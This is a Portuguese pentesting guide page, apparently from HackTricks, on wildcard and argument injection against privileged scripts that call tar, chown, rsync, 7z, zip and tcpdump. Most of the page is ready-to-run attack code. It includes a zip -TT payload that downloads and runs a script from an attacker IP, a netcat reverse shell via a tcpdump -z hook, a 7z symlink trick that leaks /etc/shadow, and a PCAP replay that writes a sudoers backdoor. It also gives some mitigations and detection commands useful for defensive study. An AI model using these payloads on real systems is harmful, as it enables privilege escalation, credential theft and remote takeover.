# Truques extras com wildcards

{{#include ../../banners/hacktricks-training.md}}

> A **argument injection** por wildcard (também chamado de *glob*) ocorre quando um script privilegiado executa um binário Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … com um wildcard sem aspas, como `*`.  
> Como o shell expande o wildcard **antes** de executar o binário, um atacante que pode criar arquivos no diretório de trabalho pode criar nomes de arquivo que começam com `-`, fazendo com que sejam interpretados como **opções em vez de dados** e, na prática, inserindo flags arbitrárias ou até comandos.<sup>[[6]](#references)</sup>
> Esta página reúne as primitivas mais úteis, pesquisas recentes e detecções modernas para 2023-2025.

## chown / chmod

Você pode **copiar o proprietário/grupo ou os bits de permissão de um arquivo de referência** abusando da flag `--reference` quando um nome de arquivo parecido com uma opção é expandido por um wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Quando o root executar posteriormente algo como:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

O `--reference=.drf.php` expandido sobrescreve o proprietário/modo explícitos, fazendo com que os arquivos correspondentes herdem os metadados de `.drf.php` (e, com a configuração acima, tornando-os graváveis pelo atacante).<sup>[[6]](#references)</sup>

Revise o helper privilegiado por inteiro, não apenas a linha de `chown`. Uma alteração de propriedade pode limpar os bits set-user-ID ou set-group-ID; [o POSIX deixa o caso privilegiado definido pela implementação](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Um `chmod` posterior no mesmo job pode restaurar esses bits nos arquivos selecionados anteriormente, alterando o resultado. Confirme a ordem real dos comandos, o diretório gravável usado pelo glob, o comportamento em relação aos arquivos e links afetados, o proprietário e o modo resultantes e se o sistema de arquivos montado permite set-user-ID antes de considerar isso um caminho para obter privilégios executando um arquivo. Se o helper não puder ser lido, essas etapas permanecem desconhecidas.

*PoC e ferramenta*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).<sup>[[7]](#references)</sup>
Consulte também o artigo clássico da DefenseCode para obter detalhes.<sup>[[6]](#references)</sup>

---

## GNU `cp` em um script privilegiado

Revise um script executado como root que copia do diretório de trabalho escolhido pelo usuário que o invoca usando um glob sem prefixo, como `cp .version * /etc/app/staged/`, quando um usuário com menos privilégios pode criar nomes de arquivo nesse diretório. O GNU `cp` pode interpretar como opção um nome de arquivo iniciado por hífen expandido a partir de `*`. A opção `--preserve=mode` pode manter os bits de modo da origem em uma nova cópia, e `--target-directory` pode alterar o destino da cópia. É necessário verificar cada um desses efeitos considerando o ramo exato do script, o estado do destino, os privilégios efetivos, a política do sistema de arquivos e o comportamento do GNU `cp`; o texto de uma regra sudo ou do script, por si só, não comprova a escalada. Prefixar os operandos com `./` ou encerrar a análise de opções com `--` impede essa interpretação de nomes iniciados por hífen no GNU `cp` ([FAQ do GNU Coreutils](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [manual do `cp`](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Execute comandos arbitrários abusando do recurso **checkpoint** do GNU tar e das ações de checkpoint.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Assim que o root executar, por exemplo, `tar -czf /root/backup.tgz *`, `shell.sh` será executado como root.<sup>[[10]](#references)</sup>

### Observação sobre a substituição do compressor no bsdtar / macOS

O `tar` padrão nas versões recentes do macOS (baseado em `libarchive`) não oferece a interface `--checkpoint` do GNU tar, mas o bsdtar documenta **--use-compress-program** para selecionar um compressor externo.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Quando um script privilegiado executa `tar -cf backup.tar *`, isso seleciona `sh` por meio do `PATH` da vítima, e o bsdtar o inicia como compressor.<sup>[[11]](#references)</sup> Isso comprova a injeção de opções, mas não é, por si só, uma primitiva confiável para executar comandos arbitrários: um nome de arquivo criado por wildcard não pode conter `/`, e o bsdtar fornece dados do arquivo, não um comando de shell escolhido pelo atacante. A execução de código também exige um executável controlável resolvido por meio do `PATH` ou outro canal de argumentos que possa indicar um programa útil.

---

## rsync

O `rsync` permite substituir o shell remoto ou o binário remoto por meio de flags de linha de comando, como `-e` e `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Se root arquivar posteriormente o diretório com `rsync -az * backup:/srv/`, a flag injetada pode executar um shell pelo mecanismo remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (modo `rsync`).

---

## 7-Zip / 7z / 7za

Mesmo quando o script privilegiado prefixa o wildcard com `--` *por precaução* (para impedir a análise de opções), a CLI do 7-Zip aceita **arquivos de lista de arquivos** quando o nome do arquivo é prefixado com `@`. Combinar isso com um symlink permite *exfiltrar arquivos arbitrários*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Se o root executar algo como:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip tentará ler `root.txt` (→ `/etc/shadow`) como uma lista de arquivos e abortará, **imprimindo o conteúdo em stderr**.<sup>[[13]](#references)</sup>

Isso funciona mesmo com `-- *`, porque a CLI do 7-Zip aceita explicitamente nomes de arquivos comuns e `@listfiles` como entradas posicionais, então um nome de arquivo literal como `@root.txt` ainda é tratado de forma especial.<sup>[[13]](#references)</sup>

---

## zip

Há dois primitivos muito práticos quando um aplicativo passa nomes de arquivos controlados pelo usuário para `zip` (seja por meio de um wildcard ou enumerando nomes sem `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` ativa o “arquivo de teste” e `-TT <cmd>` substitui o programa de teste por um programa arbitrário (forma longa: `--unzip-command <cmd>`). Se você puder injetar nomes de arquivos que começam com `-`, divida as flags entre nomes de arquivos distintos para que a análise de opções curtas funcione.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Notas
- NÃO tente usar um único nome de arquivo como `'-T -TT <cmd>'` — as opções curtas são interpretadas caractere por caractere, e isso falhará. Use tokens separados, como mostrado.<sup>[[3]](#references)</sup>
- Se o app remover barras dos nomes de arquivo, baixe de um host/IP sem caminho (caminho padrão `/index.html`) e salve localmente com `-O`; depois, execute.<sup>[[3]](#references)</sup>
- Você pode depurar a análise com `-sc` (exibe o argv processado) ou `-h2` (mais ajuda) para entender como seus tokens são consumidos.<sup>[[3]](#references)</sup>

Exemplo (comportamento local no zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: Se a camada web exibir o stdout/stderr de `zip` (algo comum em wrappers ingênuos), flags injetadas como `--help` ou erros causados por opções inválidas aparecerão na resposta HTTP, confirmando a command-line injection e ajudando a ajustar os payloads.<sup>[[3]](#references)</sup>

---

## Candidatos adicionais a option-injection

Quando um wrapper com privilégios expande um diretório gravável usando um wildcard, vale verificar estes hooks de opções documentados.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binário | Flag a explorar | Efeito |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Passa uma string de comando para um shell |
| `git`   | `-c core.sshCommand=<cmd>` | Usa `<cmd>` em vez de SSH para Git fetch/push |
| `scp`   | `-S <program>` | Usa um programa alternativo compatível com SSH para a conexão |

Essas primitivas são verificações úteis além dos clássicos *tar/rsync/zip*.

---

## Procurando wrappers e jobs vulneráveis

Estudos de caso recentes e orientações de detecção mostram que wildcard/argv injection já não é apenas um problema de **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> A mesma classe de bug continua aparecendo em:

- recursos web que permitem "baixar tudo como zip/tar" a partir de diretórios de upload controlados por atacantes
- shells de debug de fornecedores/appliances que expõem um wrapper de **tcpdump** com campos de nome de arquivo/filtro controlados por atacantes
- jobs de backup ou rotação que executam `tar`, `rsync`, `7z`, `zip`, `chown` ou `chmod` em diretórios graváveis

Comandos úteis para triagem (a invocação de `pspy` usa as flags documentadas para eventos de processos/arquivos e intervalo).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Heurísticas rápidas:

- `-- *` é uma boa correção para muitas ferramentas GNU, mas **não** para `7z`/`7za`, porque `@listfiles` são analisados separadamente.<sup>[[13]](#references)</sup>
- Para `zip`, procure wrappers que enumerem diretamente nomes de arquivos controlados pelo usuário; a separação de opções curtas (`-T` + `-TT <cmd>`) ainda funciona mesmo sem um glob de shell.<sup>[[2]](#references)[[3]](#references)</sup>
- Para `tcpdump`, preste atenção especial a wrappers que permitem controlar **nomes dos arquivos de saída**, **configurações de rotação** ou argumentos de **reprodução de arquivos de captura**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE via injeção de argv em wrappers

Quando um shell restrito ou wrapper de fornecedor monta uma linha de comando do `tcpdump` concatenando campos controlados pelo usuário (por exemplo, um parâmetro de "nome do arquivo") sem validação ou escape rigorosos, é possível inserir flags extras do `tcpdump`. A combinação de `-G` (rotação baseada em tempo), `-W` (limita o número de arquivos) e `-z <cmd>` (comando executado após a rotação) permite a execução arbitrária de comandos como o usuário que executa o tcpdump (geralmente root em appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Pré-requisitos:

- Você pode influenciar o `argv` passado ao `tcpdump` (por exemplo, por meio de um wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- O wrapper não sanitiza espaços nem tokens com prefixo `-` no campo do nome do arquivo.<sup>[[4]](#references)</sup>

PoC clássico (executa um script de reverse shell a partir de um caminho com permissão de escrita).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Details:

- `-G 1` faz a rotação a cada segundo, e `-W 1` para após um arquivo rotacionado; a captura precisa receber um pacote correspondente antes da rotação.<sup>[[18]](#references)</sup>
- `-z <cmd>` executa o comando post-rotate uma vez por rotação e passa o caminho do savefile fechado como argumento; garanta que o tratamento de argumentos do script/intérprete corresponda ao seu payload.<sup>[[18]](#references)</sup>

Variantes sem mídia removível:

- Se você tiver qualquer outra primitiva para gravar arquivos (por exemplo, um wrapper de comando separado que permita redirecionar a saída), coloque seu script em um caminho conhecido e acione `-z /path/script.sh`; se necessário, faça o script invocar `/bin/sh` por conta própria.<sup>[[18]](#references)</sup>
- Se um wrapper do fornecedor permitir escolher o caminho rotacionado, audite esse controle de caminho somente em combinação com um comando post-rotate que interprete o argumento savefile; o controle de caminho, por si só, não executa o conteúdo do arquivo.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump com curingas/argumentos adicionais → gravação/leitura arbitrária e root

Exemplo de antipadrão sudoers:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

A regra deixa várias opções disponíveis no parser documentado do tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- O glob `*` e os padrões permissivos restringem apenas o primeiro argumento de `-w`. `tcpdump` aceita várias opções `-w`; a última prevalece.<sup>[[3]](#references)[[18]](#references)</sup>
- A regra não fixa outras opções, então `-Z`, `-r`, `-V` etc. são permitidas.<sup>[[3]](#references)[[18]](#references)</sup>

As primitivas relevantes estão documentadas abaixo.<sup>[[3]](#references)[[18]](#references)</sup>
- Sobrescreva o caminho de destino com um segundo `-w` (o primeiro apenas satisfaz o sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal dentro do primeiro `-w` para escapar da árvore restrita.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Force a propriedade dos arquivos de saída com `-Z root` (cria arquivos pertencentes ao root em qualquer lugar).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Gravação de conteúdo arbitrário ao reproduzir um PCAP criado especialmente com `-r` (por exemplo, para adicionar uma linha ao sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Crie um PCAP que contenha a carga ASCII exata e grave-o como root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Leitura arbitrária de arquivos/leak de segredos com `-V <file>` (interpreta uma lista de arquivos de salvamento). As mensagens de diagnóstico de erro frequentemente repetem linhas, causando leak de conteúdo.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection para RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Cadeia completa de exploit](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Possível shell detectado via injeção de wildcard](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [De Volta para o Futuro: wildcards Unix à solta (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils - invocação de `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils - invocação de `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Checkpoints do GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Manual de bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Manual de rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Sintaxe da linha de comando do 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Manual de flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Documentação de configuração do Git](https://git-scm.com/docs/git-config)
- [17] [Manual de `scp` do OpenBSD](https://man.openbsd.org/scp)
- [18] [Manual de tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
